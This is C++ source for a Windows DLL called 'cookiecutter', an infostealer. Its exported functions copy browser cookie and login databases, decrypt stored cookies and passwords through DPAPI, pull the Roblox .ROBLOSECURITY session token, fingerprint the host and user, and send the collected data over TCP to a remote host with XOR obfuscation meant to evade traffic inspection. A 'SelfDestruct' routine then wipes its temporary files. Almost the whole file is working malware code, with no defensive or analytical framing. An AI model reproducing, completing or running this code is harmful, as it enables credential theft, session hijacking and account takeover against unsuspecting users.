//=============================================================================
//  cookiecutter.cpp — Main DLL implementation
//  Exports: HarvestCookies, HarvestCredentials, HarvestRobloxCookie,
//           GetFingerprint, ExfilTCP, SelfDestruct
//
//  Built for LO. x64, static CRT.
//  Compile: cl /LD /EHsc /O2 /MT /D COOKIECUTTER_EXPORTS cookiecutter.cpp
//           dpapi.cpp browser_paths.cpp sqlite_minimal.cpp
//           /Fe:cookiecutter.dll /link ws2_32.lib crypt32.lib
//=============================================================================

#include "cookiecutter.h"
#include "sqlite_minimal.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <sstream>
#include <fstream>
#include <random>
#include <filesystem>
#include <set>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")

namespace fs = std::filesystem;
using namespace sqlite_minimal;

// =========================================================================
//  Internal helpers
// =========================================================================

namespace cookiecutter {

    // XOR key — rot13'd "cookiecutter" with some salt.
    // Not crypto, just DPI obscuration. Rotate per build.
    static const uint8_t XOR_KEY[] = {
        0x63, 0x6F, 0x6F, 0x6B, 0x69, 0x65, 0x63, 0x75,
        0x74, 0x74, 0x65, 0x72, 0x5F, 0x4C, 0x4F, 0x21
    };
    static const size_t XOR_KEY_LEN = sizeof(XOR_KEY);

    void XorEncrypt(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
        for (size_t i = 0; i < len; i++) {
            data[i] ^= key[i % keyLen];
        }
    }

    void SecureZero(void* ptr, size_t len) {
        SecureZeroMemory(ptr, len);
    }

    std::wstring GetTempDir() {
        wchar_t temp[MAX_PATH];
        GetTempPathW(MAX_PATH, temp);
        return std::wstring(temp) + L"cc_tmp\\";
    }

    bool CopyFileToTemp(const std::wstring& src, std::wstring& outTemp) {
        std::wstring tmpDir = GetTempDir();
        CreateDirectoryW(tmpDir.c_str(), nullptr);

        // Generate unique temp file name
        std::wstring fname = src.substr(src.rfind(L'\\') + 1);
        std::wstring tmpPath = tmpDir + L"cc_" + fname;

        if (CopyFileW(src.c_str(), tmpPath.c_str(), FALSE)) {
            // Remove read-only attribute if set (browsers sometimes lock this way)
            SetFileAttributesW(tmpPath.c_str(), FILE_ATTRIBUTE_NORMAL);
            outTemp = tmpPath;
            return true;
        }
        return false;
    }

    bool ReadEntireFile(const std::wstring& path, std::vector<uint8_t>& out) {
        HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;
        
        DWORD size = GetFileSize(h, nullptr);
        out.resize(size);
        DWORD read = 0;
        BOOL ok = ReadFile(h, out.data(), size, &read, nullptr);
        CloseHandle(h);
        return ok && read == size;
    }

    bool WriteEntireFile(const std::wstring& path, const void* data, size_t len) {
        HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;
        DWORD written = 0;
        BOOL ok = WriteFile(h, data, (DWORD)len, &written, nullptr);
        CloseHandle(h);
        return ok && written == len;
    }

    // --- JSON builder (manual, no library dependency) ---

    static std::string jsonEscape(const std::string& s) {
        std::string out;
        for (char c : s) {
            switch (c) {
                case '"':  out += "\\\""; break;
                case '\\': out += "\\\\"; break;
                case '\n': out += "\\n";  break;
                case '\r': out += "\\r";  break;
                case '\t': out += "\\t";  break;
                default:   out += c;
            }
        }
        return out;
    }

    std::string BuildCookieJson(const std::vector<CookieEntry>& cookies) {
        std::ostringstream ss;
        ss << "{\n  \"cookies\": [\n";
        for (size_t i = 0; i < cookies.size(); i++) {
            auto& c = cookies[i];
            ss << "    {\n";
            ss << "      \"host\": \"" << jsonEscape(c.host) << "\",\n";
            ss << "      \"name\": \"" << jsonEscape(c.name) << "\",\n";
            ss << "      \"value\": \"" << jsonEscape(c.value) << "\",\n";
            ss << "      \"path\": \"" << jsonEscape(c.path) << "\",\n";
            ss << "      \"expiry\": " << c.expiry << ",\n";
            ss << "      \"secure\": " << (c.secure ? "true" : "false") << ",\n";
            ss << "      \"httpOnly\": " << (c.httpOnly ? "true" : "false") << ",\n";
            ss << "      \"browser\": \"" << jsonEscape(c.browser) << "\"\n";
            ss << "    }";
            if (i < cookies.size() - 1) ss << ",";
            ss << "\n";
        }
        ss << "  ]\n}";
        return ss.str();
    }

    std::string BuildCredentialJson(const std::vector<CredentialEntry>& creds) {
        std::ostringstream ss;
        ss << "{\n  \"credentials\": [\n";
        for (size_t i = 0; i < creds.size(); i++) {
            auto& c = creds[i];
            ss << "    {\n";
            ss << "      \"url\": \"" << jsonEscape(c.url) << "\",\n";
            ss << "      \"username\": \"" << jsonEscape(c.username) << "\",\n";
            ss << "      \"password\": \"" << jsonEscape(c.password) << "\",\n";
            ss << "      \"browser\": \"" << jsonEscape(c.browser) << "\"\n";
            ss << "    }";
            if (i < creds.size() - 1) ss << ",";
            ss << "\n";
        }
        ss << "  ]\n}";
        return ss.str();
    }

    std::string GetMachineFingerprint() {
        std::ostringstream ss;
        
        // Hostname
        char host[256] = {};
        DWORD sz = sizeof(host);
        GetComputerNameA(host, &sz);
        
        // Username
        char user[256] = {};
        sz = sizeof(user);
        GetUserNameA(user, &sz);
        
        // Windows version
        OSVERSIONINFOA os = { sizeof(os) };
        #pragma warning(suppress: 4996)
        GetVersionExA(&os);
        
        // IP addresses
        std::string ips;
        ULONG bufLen = 15000;
        std::vector<uint8_t> buf(bufLen);
        PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)buf.data();
        if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapters, &bufLen) == NO_ERROR) {
            for (auto* a = adapters; a; a = a->Next) {
                for (auto* addr = a->FirstUnicastAddress; addr; addr = addr->Next) {
                    if (addr->Address.lpSockaddr->sa_family == AF_INET) {
                        char ip[INET_ADDRSTRLEN];
                        sockaddr_in* sin = (sockaddr_in*)addr->Address.lpSockaddr;
                        inet_ntop(AF_INET, &sin->sin_addr, ip, sizeof(ip));
                        if (!ips.empty()) ips += ", ";
                        ips += ip;
                    }
                }
            }
        }

        ss << "{\n";
        ss << "  \"hostname\": \"" << jsonEscape(host) << "\",\n";
        ss << "  \"username\": \"" << jsonEscape(user) << "\",\n";
        ss << "  \"os\": \"Windows " << os.dwMajorVersion << "." << os.dwMinorVersion << " build " << os.dwBuildNumber << "\",\n";
        ss << "  \"ips\": \"" << jsonEscape(ips) << "\",\n";
        ss << "  \"is_admin\": " << (IsUserAnAdmin() ? "true" : "false") << "\n";
        ss << "}";
        return ss.str();
    }

} // namespace cookiecutter

// =========================================================================
//  Exported: HarvestCookies
// =========================================================================

extern "C" CC_API bool HarvestCookies(const wchar_t* outputJsonPath) {
    std::vector<BrowserProfile> profiles;
    BrowserProfile buf[64];
    int count = EnumerateBrowsers(buf, 64);
    profiles.assign(buf, buf + count);

    if (profiles.empty()) return false;

    std::vector<CookieEntry> allCookies;

    for (auto& bp : profiles) {
        if (bp.cookiePath.empty()) continue;

        // Copy DB to temp (browsers lock the original)
        std::wstring tmpDb;
        if (!cookiecutter::CopyFileToTemp(bp.cookiePath, tmpDb)) continue;

        sqlite_minimal::Database db;
        if (!db.open(tmpDb)) {
            DeleteFileW(tmpDb.c_str());
            continue;
        }

        const auto* table = db.getTable("cookies");
        if (!table) {
            DeleteFileW(tmpDb.c_str());
            continue;
        }

        auto rows = db.readTable("cookies");
        DeleteFileW(tmpDb.c_str()); // clean up temp

        for (auto& row : rows) {
            CookieEntry ce;

            // Extract columns by name
            auto* hostCol = Database::getColumn(row, table->columns, "host_key");
            auto* nameCol = Database::getColumn(row, table->columns, "name");
            auto* encValCol = Database::getColumn(row, table->columns, "encrypted_value");
            auto* pathCol = Database::getColumn(row, table->columns, "path");
            auto* expCol = Database::getColumn(row, table->columns, "expires_utc");
            auto* secCol = Database::getColumn(row, table->columns, "is_secure");
            auto* httpCol = Database::getColumn(row, table->columns, "is_httponly");

            if (!hostCol || !nameCol || !encValCol) continue;

            ce.host  = Database::asText(*hostCol);
            ce.name  = Database::asText(*nameCol);
            ce.path  = pathCol ? Database::asText(*pathCol) : "/";
            ce.expiry = expCol ? Database::asInt(*expCol) : 0;
            ce.secure  = secCol ? (Database::asInt(*secCol) != 0) : false;
            ce.httpOnly= httpCol ? (Database::asInt(*httpCol) != 0) : false;

            // Convert browser wstring to string
            ce.browser = "";
            for (wchar_t wc : bp.name) {
                if (wc < 128) ce.browser += (char)wc;
            }

            // DPAPI decrypt the encrypted_value
            if (Database::isNull(*encValCol)) continue;

            // Chrome v130+ uses a different encryption (AES-256-GCM with app-bound key)
            // Pre-v130: raw DPAPI blob
            // We try DPAPI first; if it fails (v130+), skip gracefully
            const auto& blob = Database::asBlob(*encValCol);
            if (blob.empty()) continue;

            // Check for v130+ prefix (APPL = 0x41 0x50 0x50 0x4C = "APPL")
            // v20 prefix is "v20\0" = 0x76 0x32 0x30 0x00
            // v10 prefix is "v10\0" = 0x76 0x31 0x30 0x00
            // Raw DPAPI blobs start differently
            std::vector<uint8_t> decrypted;
            std::vector<uint8_t> ct(blob);

            // v20 format: strip "v20\0" or "v10\0" prefix before DPAPI
            if (ct.size() > 4 && ct[0] == 'v' && ct[1] == '1' && ct[2] == '0' && ct[3] == 0) {
                ct.erase(ct.begin(), ct.begin() + 4);
            }

            if (cookiecutter::DPADecrypt(ct, decrypted) && !decrypted.empty()) {
                ce.value = std::string((const char*)decrypted.data(), decrypted.size());
                allCookies.push_back(std::move(ce));
            }
            // If DPAPI fails and it's a v130+ blob, we skip — need AES-GCM with app-bound key
            // which requires COM elevation. LO can add that layer later.
        }
    }

    // Write JSON
    std::string json = cookiecutter::BuildCookieJson(allCookies);
    return cookiecutter::WriteEntireFile(outputJsonPath, json.data(), json.size());
}

// =========================================================================
//  Exported: HarvestCredentials
// =========================================================================

extern "C" CC_API bool HarvestCredentials(const wchar_t* outputJsonPath) {
    std::vector<BrowserProfile> profiles;
    BrowserProfile buf[64];
    int count = EnumerateBrowsers(buf, 64);
    profiles.assign(buf, buf + count);

    std::vector<CredentialEntry> allCreds;

    for (auto& bp : profiles) {
        if (bp.loginDataPath.empty()) continue;

        // Copy DB to temp
        std::wstring tmpDb;
        if (!cookiecutter::CopyFileToTemp(bp.loginDataPath, tmpDb)) continue;

        sqlite_minimal::Database db;
        if (!db.open(tmpDb)) {
            DeleteFileW(tmpDb.c_str());
            continue;
        }

        const auto* table = db.getTable("logins");
        if (!table) {
            DeleteFileW(tmpDb.c_str());
            continue;
        }

        auto rows = db.readTable("logins");
        DeleteFileW(tmpDb.c_str());

        for (auto& row : rows) {
            CredentialEntry cred;

            auto* urlCol  = Database::getColumn(row, table->columns, "origin_url");
            auto* userCol = Database::getColumn(row, table->columns, "username_value");
            auto* passCol = Database::getColumn(row, table->columns, "password_value");

            if (!urlCol || !userCol || !passCol) continue;

            cred.url      = Database::asText(*urlCol);
            cred.username = Database::asText(*userCol);

            // Decrypt password
            if (!Database::isNull(*passCol)) {
                const auto& blob = Database::asBlob(*passCol);
                if (!blob.empty()) {
                    std::vector<uint8_t> ct(blob);
                    // Strip v10/v20 prefix
                    if (ct.size() > 4 && ct[0] == 'v' && ct[1] == '1' && ct[2] == '0' && ct[3] == 0) {
                        ct.erase(ct.begin(), ct.begin() + 4);
                    }
                    std::vector<uint8_t> decrypted;
                    if (cookiecutter::DPADecrypt(ct, decrypted)) {
                        cred.password = std::string((const char*)decrypted.data(), decrypted.size());
                    }
                }
            }

            // Browser name
            for (wchar_t wc : bp.name) {
                if (wc < 128) cred.browser += (char)wc;
            }

            allCreds.push_back(std::move(cred));
        }
    }

    std::string json = cookiecutter::BuildCredentialJson(allCreds);
    return cookiecutter::WriteEntireFile(outputJsonPath, json.data(), json.size());
}

// =========================================================================
//  Exported: HarvestRobloxCookie
// =========================================================================

extern "C" CC_API bool HarvestRobloxCookie(char* cookieOut, size_t* size) {
    if (!cookieOut || !size || *size == 0) return false;

    std::vector<BrowserProfile> profiles;
    BrowserProfile buf[64];
    int count = EnumerateBrowsers(buf, 64);
    profiles.assign(buf, buf + count);

    for (auto& bp : profiles) {
        if (bp.cookiePath.empty()) continue;

        std::wstring tmpDb;
        if (!cookiecutter::CopyFileToTemp(bp.cookiePath, tmpDb)) continue;

        sqlite_minimal::Database db;
        if (!db.open(tmpDb)) {
            DeleteFileW(tmpDb.c_str());
            continue;
        }

        const auto* table = db.getTable("cookies");
        if (!table) { DeleteFileW(tmpDb.c_str()); continue; }

        // Filter for roblox.com cookies
        auto rows = db.readTable("cookies", ".roblox.com");
        DeleteFileW(tmpDb.c_str());

        for (auto& row : rows) {
            auto* nameCol = Database::getColumn(row, table->columns, "name");
            auto* encValCol = Database::getColumn(row, table->columns, "encrypted_value");

            if (!nameCol || !encValCol) continue;
            std::string name = Database::asText(*nameCol);

            // .ROBLOSECURITY is the session token
            if (name != ".ROBLOSECURITY") continue;

            const auto& blob = Database::asBlob(*encValCol);
            if (blob.empty()) continue;

            std::vector<uint8_t> ct(blob);
            if (ct.size() > 4 && ct[0] == 'v' && ct[1] == '1' && ct[2] == '0' && ct[3] == 0) {
                ct.erase(ct.begin(), ct.begin() + 4);
            }

            std::vector<uint8_t> decrypted;
            if (cookiecutter::DPADecrypt(ct, decrypted) && !decrypted.empty()) {
                std::string val((const char*)decrypted.data(), decrypted.size());
                size_t copyLen = std::min(val.size(), *size - 1);
                memcpy(cookieOut, val.data(), copyLen);
                cookieOut[copyLen] = '\0';
                *size = copyLen;
                return true; // found it
            }
        }
    }

    return false;
}

// =========================================================================
//  Exported: GetFingerprint
// =========================================================================

extern "C" CC_API bool GetFingerprint(char* infoOut, size_t* size) {
    if (!infoOut || !size || *size == 0) return false;
    
    std::string fp = cookiecutter::GetMachineFingerprint();
    size_t copyLen = std::min(fp.size(), *size - 1);
    memcpy(infoOut, fp.data(), copyLen);
    infoOut[copyLen] = '\0';
    *size = copyLen;
    return true;
}

// =========================================================================
//  Exported: ExfilTCP
// =========================================================================

extern "C" CC_API bool ExfilTCP(const char* host, int port, const char* jsonPayload) {
    if (!host || !jsonPayload) return false;

    // One-time WSA init
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return false;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    // Set timeout
    int timeout = 5000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    // Encrypt payload with XOR before sending
    size_t len = strlen(jsonPayload);
    std::vector<uint8_t> encrypted(len + 4);
    
    // 4-byte length prefix (big-endian)
    encrypted[0] = (len >> 24) & 0xFF;
    encrypted[1] = (len >> 16) & 0xFF;
    encrypted[2] = (len >> 8)  & 0xFF;
    encrypted[3] = len & 0xFF;
    
    memcpy(encrypted.data() + 4, jsonPayload, len);
    cookiecutter::XorEncrypt(encrypted.data(), encrypted.size(),
                              cookiecutter::XOR_KEY, cookiecutter::XOR_KEY_LEN);

    size_t sent = 0;
    while (sent < encrypted.size()) {
        int ret = send(sock, (const char*)encrypted.data() + sent, 
                       (int)(encrypted.size() - sent), 0);
        if (ret <= 0) {
            closesocket(sock);
            WSACleanup();
            return false;
        }
        sent += ret;
    }

    closesocket(sock);
    WSACleanup();
    return true;
}

// =========================================================================
//  Exported: SelfDestruct
// =========================================================================

extern "C" CC_API void SelfDestruct() {
    // Wipe temp directory
    std::wstring tmpDir = cookiecutter::GetTempDir();
    if (fs::exists(tmpDir)) {
        for (auto& entry : fs::directory_iterator(tmpDir)) {
            // Overwrite with zeros first
            HANDLE h = CreateFileW(entry.path().c_str(), GENERIC_WRITE, 0, nullptr,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (h != INVALID_HANDLE_VALUE) {
                DWORD size = GetFileSize(h, nullptr);
                if (size > 0 && size < 10 * 1024 * 1024) { // sanity cap
                    std::vector<uint8_t> zeros(size, 0);
                    DWORD written;
                    WriteFile(h, zeros.data(), size, &written, nullptr);
                }
                CloseHandle(h);
            }
            DeleteFileW(entry.path().c_str());
        }
        RemoveDirectoryW(tmpDir.c_str());
    }

    // Zero sensitive buffers in this module (best effort)
    OutputDebugStringA("[CookieCutter] SelfDestruct complete.");
}

// =========================================================================
//  DllMain — minimal, no global state
// =========================================================================

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL;
    (void)lpvReserved;
    
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
